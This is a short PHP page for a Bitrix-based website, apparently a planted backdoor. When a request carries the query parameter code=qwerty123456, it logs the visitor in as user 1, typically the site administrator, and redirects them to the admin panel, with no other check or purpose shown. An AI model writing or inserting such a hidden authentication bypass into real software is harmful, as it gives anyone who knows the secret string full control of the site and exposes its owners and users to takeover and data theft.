<?
require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");
if ($_GET['code'] == 'qwerty123456') {
    global $USER;
    $USER->Authorize(1);
    LocalRedirect("/bitrix/admin/");
}
?>
